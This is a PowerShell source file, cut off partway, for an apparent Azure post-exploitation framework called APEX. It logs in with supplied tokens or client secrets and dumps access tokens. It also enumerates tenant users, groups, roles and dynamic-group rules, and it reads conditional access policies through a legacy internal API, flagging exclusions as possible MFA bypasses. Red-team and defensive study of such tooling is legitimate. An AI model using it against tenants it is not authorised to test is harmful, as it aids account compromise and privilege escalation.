# Post Exploitation Tool for MS Cloud
# Combines Azure CLI and the Az and Graph PS Modules
# Optimized and tested with PS7. Some functions might not work with PS5

# Global variables to store tenant information and login accounts
$Global:tenantDomain = "Not set"
$Global:tenantID = "Not set"
$Global:azureCliAccount = "Not logged in"
$Global:azureCliId = "N/A"
$Global:azureCliSPName = "N/A"
$Global:azModuleAccount = "Not logged in"
$Global:azModuleId = "N/A"
$Global:azModuleSPName = "N/A"
$Global:graphModuleAccount = "Not logged in"
$Global:graphModuleId = "N/A"

# Header information for all menus
function DisplayHeader {
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "==== APEX - Azure Post Exploitation Framework ====" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Tenant Name: $tenantDomain" -ForegroundColor $(if ($tenantDomain -eq "Not set") { "Red" } else { "Green" })
    Write-Host "Tenant ID: $tenantID" -ForegroundColor $(if ($tenantID -eq "Not set") { "Red" } else { "Green" })
    Write-Host "Azure CLI Account Name: $azureCliAccount" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Azure CLI Account Object ID: $azureCliId" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Azure CLI Account Service Principal Name: $azureCliSPName" -ForegroundColor $(if ($azureCliAccount -eq "Not logged in") { "Red" } else { "DarkGreen" })
    Write-Host "Az PS Module Account: $azModuleAccount" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Az PS Module Object ID: $azModuleId" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Az PS Module Service Principal Name: $azModuleSPName" -ForegroundColor $(if ($azModuleAccount -eq "Not logged in") { "Red" } else { "Yellow" })
    Write-Host "Graph PS Module Account Name: $graphModuleAccount" -ForegroundColor $(if ($graphModuleAccount -eq "Not logged in") { "Red" } else { "DarkYellow" })
    Write-Host "Graph PS Module Objet ID: $graphModuleId" -ForegroundColor $(if ($graphModuleAccount -eq "Not logged in") { "Red" } else { "DarkYellow" })
    Write-Host ""
}

# Function to clear Azure CLI details
function ResetAzureCliDetails {
    $Global:azureCliAccount = "Not logged in"
    $Global:azureCliId = "N/A"
    $Global:azureCliSPName = "N/A"
}

# Function to clear Az PowerShell module details
function ResetAzModuleDetails {
    $Global:azModuleAccount = "Not logged in"
    $Global:azModuleId = "N/A"
    $Global:azModuleSPName = "N/A"
}

# Function to clear Graph PowerShell module details
function ResetGraphModuleDetails {
    $Global:graphModuleAccount = "Not logged in"
    $Global:graphModuleId = "N/A"
}

# Function to check if Azure CLI is installed and up to date
function Check-AzureCLI {
    Write-Host "Checking if az CLI is installed..."
    
    try {
        $versionRawOutput = az --version

        $hasUpdates = $false
        $versionRawOutput | ForEach-Object { 
            Write-Host $_
        }
        
        if ($versionRawOutput -match 'WARNING: You have \d+ update\(s\) available.') {
            Write-Host "Updates are available for az CLI." -ForegroundColor Yellow
            $upgradeChoice = Read-Host -Prompt "Would you like to upgrade to the latest version? (Y/N)"
            if ($upgradeChoice -eq "Y") {
                Write-Host "Upgrading az CLI..."
                az upgrade --yes
            }
        } else {
            Write-Host "az CLI is up to date." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "az CLI is not installed." -ForegroundColor Red
        $installChoice = Read-Host -Prompt "Would you like to install it? (Y/N)"
        if ($installChoice -eq "Y") {
            Write-Host "Installing az CLI..."
            Invoke-Expression "Invoke-WebRequest -Uri https://aka.ms/InstallAzureCliWindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -ArgumentList '/i', '.\AzureCLI.msi', '/quiet', '/norestart' -Wait; Remove-Item -Force .\AzureCLI.msi"
            Write-Host "az CLI installed successfully." -ForegroundColor Green
        }
    }
}

# Function to check if a PowerShell module is installed, can be imported, and needs an update
function Check-UpdateModule {
    param (
        [string]$moduleName
    )

    Write-Host "Checking availability of $moduleName module..."

    if (Get-Module -ListAvailable -Name $moduleName) {
        try {
            if (-not (Get-Module -Name $moduleName)) {
                Write-Host "Importing $moduleName module..."
                Import-Module $moduleName -ErrorAction Stop
            }
            Write-Host "$moduleName module is installed and successfully imported." -ForegroundColor Green

            # Check for module updates
            Write-Host "Checking for updates for $moduleName module..."
            $moduleVersion = (Get-InstalledModule -Name $moduleName).Version
            $availableVersion = (Find-Module -Name $moduleName).Version

            if ($moduleVersion -lt $availableVersion) {
                Write-Host "A newer version of $moduleName module is available." -ForegroundColor Yellow
                $updateChoice = Read-Host -Prompt "Would you like to update $moduleName module? (Y/N)"
                if ($updateChoice -eq "Y") {
                    Write-Host "Updating $moduleName module..."
                    Update-Module -Name $moduleName -Force
                    Write-Host "$moduleName module updated successfully." -ForegroundColor Green
                }
            } else {
                Write-Host "$moduleName module is up to date." -ForegroundColor Green
            }
        }
        catch {
            Write-Host "Unable to import $moduleName module despite it being installed." -ForegroundColor Red
        }
    }
    else {
        Write-Host "$moduleName module is not installed." -ForegroundColor Yellow
        $installChoice = Read-Host -Prompt "Would you like to install it? (Y/N)"
        if ($installChoice -eq "Y") {
            Write-Host "Installing $moduleName module..."
            Install-Module -Name $moduleName -AllowClobber -Scope CurrentUser -Force
            Write-Host "Importing $moduleName module..."
            Import-Module $moduleName -ErrorAction Stop
            Write-Host "$moduleName module was successfully installed and imported." -ForegroundColor Green
        }
    }
}

# Login menu structure
function LoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Login Menu" -ForegroundColor Cyan
        Write-Host "1. Set Tenant"
        Write-Host "2. Azure CLI Login"
        Write-Host "3. Az PowerShell Module Login"
        Write-Host "4. Microsoft Graph PowerShell Module Login"
        Write-Host "5. Get AccessToken"
        Write-Host "6. Logout everything and forget Tenant"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                Set-Tenant
            }
            "2" {
                AzureCLILoginMenu
            }
            "3" {
                AzPSLoginMenu
            }
            "4" {
                GraphPSLoginMenu
            }
            "5" {
                GetAccessToken
            }
            "6" {
                Logout-AllServices
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to set the tenant using an external API
function Set-Tenant {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Set Tenant Menu" -ForegroundColor Cyan
        Write-Host "Enter tenant domain:" -ForegroundColor Yellow
        $tenantDomainInput = Read-Host

        if ($tenantDomainInput -eq "B") {
            return
        }

        if ($tenantDomainInput) {
            try {
                $TenantId = (Invoke-RestMethod -UseBasicParsing -Uri "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=$tenantDomainInput").TenantId
                
                if ($TenantId) {
                    $Global:tenantID = $TenantId
                    $Global:tenantDomain = $tenantDomainInput
                    Write-Host "Tenant set to: $tenantDomain (ID: $tenantID)" -ForegroundColor Green
                    break
                } else {
                    Write-Host "Failed to retrieve tenant ID. The domain might be incorrect." -ForegroundColor Red
                }
            }
            catch {
                Write-Host "Failed to retrieve tenant details. The domain might be incorrect." -ForegroundColor Red
            }
        } else {
            Write-Host "Invalid tenant input." -ForegroundColor Red
        }
    }
}

# Function to get access tokens
function GetAccessToken {
    Clear-Host
    DisplayHeader
    Write-Host "Get Access Token" -ForegroundColor Cyan
    Write-Host "Select tool to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    $toolChoice = Read-Host

    try {
        Clear-Host
        DisplayHeader
        if ($toolChoice -eq "1") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            az account get-access-token --output json
        }
        elseif ($toolChoice -eq "2") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $token = Get-AzAccessToken
            Write-Host "Token: $($token.Token)" -ForegroundColor Green
        }
        else {
            Write-Host "Invalid selection, please try again." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error fetching access token: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Azure CLI Login Menu
function AzureCLILoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Azure CLI Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Service Principal"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-AzureCLI
            }
            "2" {
                Login-AzureCLI-SP
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Azure CLI
function Login-AzureCLI {
    ResetAzureCliDetails
    Write-Host "Logging into Azure CLI using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        az logout
        if ($tenantID -ne "Not set") {
            $result = az login --tenant $tenantID --output json
            $loginInfo = $result | ConvertFrom-Json | Select-Object -First 1
            $Global:azureCliAccount = $loginInfo.user.name

            # Fetch Object ID using the logged-in user
            $userId = az ad user show --id $loginInfo.user.name --query id -o tsv
            $Global:azureCliId = $userId

            Write-Host "Successfully logged into Azure CLI as $azureCliAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Error during Azure CLI login: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Azure CLI as a service principal
function Login-AzureCLI-SP {
    ResetAzureCliDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Azure CLI as Service Principal" -ForegroundColor Cyan
    Write-Host "Enter the application (client) ID:" -ForegroundColor Yellow
    $appId = Read-Host

    Write-Host "Enter the client secret:" -ForegroundColor Yellow
    $clientSecret = Read-Host

    try {
        az logout

        az login --service-principal -u $appId -p $clientSecret --tenant $Global:tenantId

        $spDetails = az ad sp show --id $appId --query "{Name: displayName, Id: id, SpName: appId}" -o json | ConvertFrom-Json
        $Global:azureCliAccount = $spDetails.Name
        $Global:azureCliId = $spDetails.Id
        $Global:azureCliSPName = $spDetails.SpName
        
        Write-Host "Successfully logged into Azure CLI as Service Principal ($spDetails.Name)." -ForegroundColor Green
        Pause
    }
    catch {
        Write-Host "Failed to login to Azure CLI as Service Principal: $_" -ForegroundColor Red
        Pause
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Az PowerShell Module Login Menu
function AzPSLoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Az PowerShell Module Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Access Token"
        Write-Host "3. Device Code"
        Write-Host "4. Service Principal"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-AzModule
            }
            "2" {
                Login-AzModule-AT
            }
            "3" {
                Login-AzModule-DC
            }
            "4" {
                Login-AzModule-SP
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Az PowerShell module
function Login-AzModule {
    ResetAzModuleDetails
    Write-Host "Logging into Az PowerShell module using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -Tenant $tenantID -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Az PowerShell module with AccessToken
function Login-AzModule-AT {
    ResetAzModuleDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Az PS Module with Access Token" -ForegroundColor Cyan
    Write-Host "Enter the Access Token" -ForegroundColor Yellow
    $AccessToken = Read-Host

    Write-Host "Enter the Account (Id or Name)" -ForegroundColor Yellow
    $id = Read-Host

   # Log out of existing sessions
    Disconnect-AzAccount -ErrorAction SilentlyContinue

    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -accesstoken $AccessToken -AccountId $id -TenantId $Global:tenantID -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Az PowerShell module
function Login-AzModule-DC {
    ResetAzModuleDetails
    Write-Host "Logging into Az PS module via Device Code flow using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        Disconnect-AzAccount -ErrorAction SilentlyContinue
        if ($tenantID -ne "Not set") {
            $account = Connect-AzAccount -Tenant $tenantID -devicecode -ErrorAction Stop
            $Global:azModuleAccount = (Get-AzContext).Account.Id
            $userId = (Get-AzADUser -UserPrincipalName $Global:azModuleAccount).Id
            $Global:azModuleId = $userId
            Write-Host "Successfully logged into Az PowerShell module as $azModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Az PowerShell module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Az PowerShell module as a service principal
function Login-AzModule-SP {
    ResetAzModuleDetails
    Clear-Host
    DisplayHeader
    Write-Host "Login to Az PS Module as Service Principal" -ForegroundColor Cyan
    Write-Host "Enter the application (client) ID:" -ForegroundColor Yellow
    $appId = Read-Host

    Write-Host "Enter the client secret:" -ForegroundColor Yellow
    $clientSecret = Read-Host

   # Log out of existing sessions
    Disconnect-AzAccount -ErrorAction SilentlyContinue

    # Convert client secret to SecureString and create PSCredential
    $secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
    $psCredential = [System.Management.Automation.PSCredential]::new($appId, $secureSecret)
    
    try {
        Connect-AzAccount -ServicePrincipal -Credential $psCredential -TenantId $Global:tenantID -ErrorAction Stop
        $spDetails = Get-AzADServicePrincipal -ApplicationId $appId
        $Global:azModuleAccount = $spDetails.AppDisplayName 
        $Global:azModuleId = $spDetails.Id
        $Global:azModuleSPName = $spDetails.AppId

        Write-Host "Successfully logged into Az PowerShell module as Service Principal ($spDetails.DisplayName)." -ForegroundColor Green
        Pause
    }
    catch {
        Write-Host "Detailed error during login: $($_.Exception.Message)" -ForegroundColor Red
        Pause
    }

    Write-Host "`nPress any key to return to the login menu..."
    [void][System.Console]::ReadKey($true)
}

# Microsoft Graph PowerShell Module Login Menu
function GraphPSLoginMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Microsoft Graph PowerShell Module Login" -ForegroundColor Cyan
        Write-Host "1. Interactively"
        Write-Host "2. Access Token"
        Write-Host "3. Device Code"
        Write-Host "B. Back to Login Menu"

        $userInput = Read-Host -Prompt "Select a login method"
        switch ($userInput) {
            "1" {
                Login-GraphModule
            }
            "2" {
                Login-GraphModule-AT
            }
            "3" {
                Login-GraphModule-DC
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to login to Microsoft Graph PowerShell module
function Login-GraphModule {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -TenantId $tenantID -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PS module as $graphModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PS module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Microsoft Graph PowerShell module via Access Token
function Login-GraphModule-AT {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module with Access Token using tenant '$tenantID'..." -ForegroundColor Yellow
    Write-Host "Enter the Access Token" -ForegroundColor Yellow
    $AccessToken = Read-Host
    $SecureToken = $AccessToken | ConvertTo-SecureString -AsPlainText -Force

    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -AccessToken $SecureToken -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to login to Microsoft Graph PowerShell module via Devicecode
function Login-GraphModule-DC {
    ResetGraphModuleDetails
    Write-Host "Logging into Microsoft Graph PS module via Device Code flow using tenant '$tenantID'..." -ForegroundColor Yellow
    try {
        # Clear any existing session
        Disconnect-MgGraph -ErrorAction SilentlyContinue
        
        if ($tenantID -ne "Not set") {
            Connect-MgGraph -TenantId $tenantID -UseDeviceAuthentication -ErrorAction Stop
            $Global:graphModuleAccount = (Get-MgContext).Account
            $Global:graphModuleId = (Get-MgUser -UserId $Global:graphModuleAccount).Id
            Write-Host "Successfully logged into Microsoft Graph PowerShell module as $graphModuleAccount." -ForegroundColor Green
            Pause
        } else {
            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
            Pause
        }
    }
    catch {
        Write-Host "Failed to login to Microsoft Graph PowerShell module: $_" -ForegroundColor Red
        Pause
    }
}

# Function to logout of all services and clear tenant information
function Logout-AllServices {
    Clear-Host
    DisplayHeader
    Write-Host "Logging out of all services and clearing tenant information..." -ForegroundColor Yellow

    try {
        az logout
        Write-Host "Logged out of Azure CLI." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Azure CLI." -ForegroundColor Red
    }

    try {
        Disconnect-AzAccount -ErrorAction Stop
        Write-Host "Logged out of Az PowerShell module." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Az PowerShell module." -ForegroundColor Red
    }

    try {
        Disconnect-MgGraph -ErrorAction Stop
        Write-Host "Logged out of Microsoft Graph PowerShell module." -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to log out of Microsoft Graph PowerShell module." -ForegroundColor Red
    }

    $Global:tenantDomain = "Not set"
    $Global:tenantID = "Not set"
    $Global:azureCliAccount = "Not logged in"
    $Global:azModuleAccount = "Not logged in"
    $Global:graphModuleAccount = "Not logged in"

    Write-Host "Tenant information and accounts have been cleared." -ForegroundColor Green
    Write-Host "`nPress any key to return to the main menu..." 
    [void][System.Console]::ReadKey($true)
}

# Queries menu structure
function QueriesMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Queries Menu" -ForegroundColor Cyan
        Write-Host "1. User Info"
        Write-Host "2. User Groups"
        Write-Host "3. Group Members"
        Write-Host "4. Role Assignments"
        Write-Host "5. Available Resources"
        Write-Host "6. Owned Objects"
        Write-Host "7. Owned Applications"
        Write-Host "8. Administrative Units (Graph only)"
        Write-Host "9. Password Policy (Graph only)"
        Write-Host "10. Get App Details (CLI only)"
        Write-Host "11. Dynamic Groups (Graph only)"
        Write-Host "12. Conditional Access Policies as low Priv User (needs AZ CLI and Graph Session and will only work till MS kills the Windows Graph API!!!)"
        Write-Host "13. Raw Command Prompt"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                UserInfoQuery
            }
            "2" {
                UserGroupsQuery
            }
            "3" {
                GroupMembersQuery
            }
            "4" {
                RoleAssignmentsQuery
            }
            "5" {
                AvailableResourcesQuery
            }
            "6" {
                OwnedObjectsQuery
            }
            "7" {
                OwnedApplicationsQuery
            }
            "8" {
                AdministrativeUnitsQuery
            }
            "9" {
                PasswordPolicyQuery
            }
            "10" {
                GetAppDetailsQuery
            }
            "11" {
                DynamicGroupsQuery
            }
            "12" {
                ConditionalAccessPoliciesQuery
            }
            "13" {
                RawCommandPrompt
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Helper Function for CAPs to resolve IDs to display names for users and applications
function Resolve-Ids {
    param (
        [array]$Ids,
        [string]$Type
    )

    $names = @{ }
    $guidPattern = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
    
    foreach ($id in $Ids) {
        if ($id -eq "All" -or $id -eq "None") {
            $names[$id] = $id
        } elseif ($id -match $guidPattern) {
            try {
                if ($Type -eq "User") {
                    $entity = Get-MgUser -UserId $id -ErrorAction Stop
                } elseif ($Type -eq "Application") {
                    $entity = Get-MgServicePrincipal -Filter "AppId eq '$id'" -ErrorAction Stop
                }
                $names[$id] = $entity.DisplayName
            } catch {
                $names[$id] = "Unavailable"
            }
        } else {
            $names[$id] = $id # Assume that if it's not an ID, it might already be a name
        }
    }
    return $names
}

# Helper Function for CAPs to fetch data from an endpoint
function Get-AllLegacyGraphData {
    param (
        [string]$AccessToken,
        [string]$InitialEndpoint
    )

    $allResults = @()
    $nextLink = $InitialEndpoint

    while ($nextLink) {
        $headers = @{ "Authorization" = "Bearer $AccessToken" }
        
        try {
            $response = Invoke-RestMethod -Uri $nextLink -Headers $headers -Method Get
        } catch {
            Write-Error "Failed to fetch data from ${nextLink}: $_"
            return $null
        }
        
        if ($response.value) {
            $allResults += $response.value
        }

        if ($response.'@odata.nextLink') {
            $nextLink = $response.'@odata.nextLink'
            Write-Host "Found nextLink for pagination: $nextLink"
        } else {
            $nextLink = $null
        }
    }
    return $allResults
}

# Helper Function for CAPs to format policy details and resolve names
function Format-PolicyDetails {
    param (
        [array]$Policies
    )

    foreach ($policy in $Policies) {
        $hasExclusions = $false
        Write-Host "`nPolicy: $($policy.displayName)" -ForegroundColor Yellow

        try {
            $details = $policy.policyDetail | ForEach-Object { ConvertFrom-Json $_ }
            foreach ($detail in $details) {
                if ($detail.Conditions.Users.Exclude -or
                    $detail.Conditions.Applications.Exclude -or
                    $detail.Conditions.DevicePlatforms.Exclude -or
                    $detail.Conditions.ClientTypes.Exclude) {
                    $hasExclusions = $true
                }

                if ($hasExclusions) {
                    Write-Host "This Policy has Exclusions. Check for MFA Bypasses!!!" -ForegroundColor Red
                }

                if ($detail.Conditions.Users.Include) {
                    $userIds = $detail.Conditions.Users.Include | ForEach-Object { $_.Users } | Select-Object -Unique
                    $userNames = Resolve-Ids -Ids $userIds -Type "User"
                    $includedUsers = ($userIds | ForEach-Object { $userNames[$_] }) -join ", "
                    Write-Host "Included Users: $includedUsers"
                }
                
                if ($detail.Conditions.Users.Exclude) {
                    $userIdsEx = $detail.Conditions.Users.Exclude | ForEach-Object { $_.Users } | Select-Object -Unique
                    $userNamesEx = Resolve-Ids -Ids $userIdsEx -Type "User"
                    $excludedUsers = ($userIdsEx | ForEach-Object { $userNamesEx[$_] }) -join ", "
                    Write-Host "Excluded Users: $excludedUsers"
                }

                if ($detail.Conditions.Applications.Include) {
                    $appIds = $detail.Conditions.Applications.Include | ForEach-Object { $_.Applications } | Select-Object -Unique
                    $appNames = Resolve-Ids -Ids $appIds -Type "Application"
                    $includedApps = ($appIds | ForEach-Object { $appNames[$_] }) -join ", "
                    Write-Host "Included Applications: $includedApps"
                }

                if ($detail.Conditions.Applications.Exclude) {
                    $appIdsEx = $detail.Conditions.Applications.Exclude | ForEach-Object { $_.Applications } | Select-Object -Unique
                    $appNamesEx = Resolve-Ids -Ids $appIdsEx -Type "Application"
                    $excludedApps = ($appIdsEx | ForEach-Object { $appNamesEx[$_] }) -join ", "
                    Write-Host "Excluded Applications: $excludedApps"
                }

                if ($detail.Conditions.DevicePlatforms.Include) {
                    $DevicePlatformsInclude = ($detail.Conditions.DevicePlatforms.Include | ForEach-Object { $_.DevicePlatforms }) -join ", "
                    Write-Host "Included DevicePlatforms: $DevicePlatformsInclude"
                }

                if ($detail.Conditions.DevicePlatforms.Exclude) {
                    $DevicePlatformsExclude = ($detail.Conditions.DevicePlatforms.Exclude | ForEach-Object { $_.DevicePlatforms }) -join ", "
                    Write-Host "Excluded DevicePlatforms: $DevicePlatformsExclude"
                }

                if ($detail.Conditions.ClientTypes.Include) {
                    $ClientsInclude = ($detail.Conditions.ClientTypes.Include | ForEach-Object { $_.ClientTypes }) -join ", "
                    Write-Host "Included Clients: $ClientsInclude"
                }

                if ($detail.Conditions.ClientTypes.Exclude) {
                    $ClientsExclude = ($detail.Conditions.ClientTypes.Exclude | ForEach-Object { $_.ClientTypes }) -join ", "
                    Write-Host "Excluded Clients: $ClientsExclude"
                }

                if ($detail.Controls.Control) {
                    $controls = ($detail.Controls.Control) -join ", "
                    Write-Host "Controls Requirements (any): $controls"
                }

                if ($detail.SessionControls) {
                    $sessionControls = ($detail.SessionControls) -join ", "
                    Write-Host "Session controls: $sessionControls"
                }
            }
        } catch {
            Write-Error "Failed to parse policy details: $_"
        }
    }
}

# Main function to fetch CAPs inspired by Roadrecon by Dirk-jan https://github.com/dirkjanm/ROADtools/tree/master/roadrecon
function ConditionalAccessPoliciesQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Fetching Conditional Access Policies" -ForegroundColor Cyan

    # Get a Graph Access Token from the authenticated Azure CLI session
    $TokenResponse = az account get-access-token --resource https://graph.windows.net --tenant $Global:tenantID
    $accessToken = ($tokenResponse | ConvertFrom-Json).accessToken

    if (-not $accessToken) {
        Write-Error "Failed to obtain access token."
        return
    }

    # Define the policies endpoint
    $policiesEndpoint = "https://graph.windows.net/$tenantId/policies?api-version=1.61-internal"
    
    # Fetch and display data from the policies endpoint
    Write-Host "Attempting to fetch data from: $policiesEndpoint" -ForegroundColor Cyan
    $policies = Get-AllLegacyGraphData -AccessToken $accessToken -InitialEndpoint $policiesEndpoint
        
    # Filter policies where policyType equals 18
    $filteredPolicies = $policies | Where-Object { $_.policyType -eq 18 }
    Format-PolicyDetails -Policies $filteredPolicies
    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)

}

# Function to query dynamic groups using Microsoft Graph PowerShell
function DynamicGroupsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Dynamic Groups Query" -ForegroundColor Cyan

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Graph PS Module output:" -ForegroundColor Magenta
        
        # Fetch dynamic groups using Microsoft Graph PowerShell
        $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" 

        foreach ($group in $dynamicGroups) {
            $groupName = $group.DisplayName
            $membershipQuery = $group.MembershipRule
            $Description = $group.Description
            Write-Output "Group Name: $groupName"
            Write-Output "Description: $Description" 
            Write-Output "Membership Query: $membershipQuery"
            Write-Output ""
        }
    }
    catch {
        Write-Host "Error retrieving dynamic groups: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query owned applications
function OwnedApplicationsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Owned Applications Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            
            # List all Azure AD applications and check ownership
